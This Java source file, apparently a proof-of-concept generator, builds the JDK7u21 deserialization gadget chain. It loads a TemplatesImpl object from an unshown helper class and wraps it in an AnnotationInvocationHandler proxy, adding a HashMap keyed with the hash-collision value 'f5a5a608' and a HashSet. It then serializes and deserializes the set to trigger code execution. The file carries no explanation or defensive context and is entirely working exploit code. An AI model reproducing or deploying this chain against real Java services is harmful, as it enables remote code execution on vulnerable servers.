import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class GenJDK7U21 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl tmpl = new templatesImpl().getTmpl();
        HashMap hashMap = new HashMap();
        hashMap.put("f5a5a608",tmpl);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler aHandler = (InvocationHandler) constructor.newInstance(Templates.class,hashMap);

        Templates templates = (Templates) Proxy.newProxyInstance(Override.class.getClassLoader(), new Class[]{Templates.class}, aHandler);
        HashSet hashSet = new HashSet();
        hashSet.add(templates);
        hashSet.add(tmpl);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashSet);
        byte[] bytes = byteArrayOutputStream.toByteArray();
        new ObjectInputStream(new ByteArrayInputStream(bytes)).readObject();
    }
}
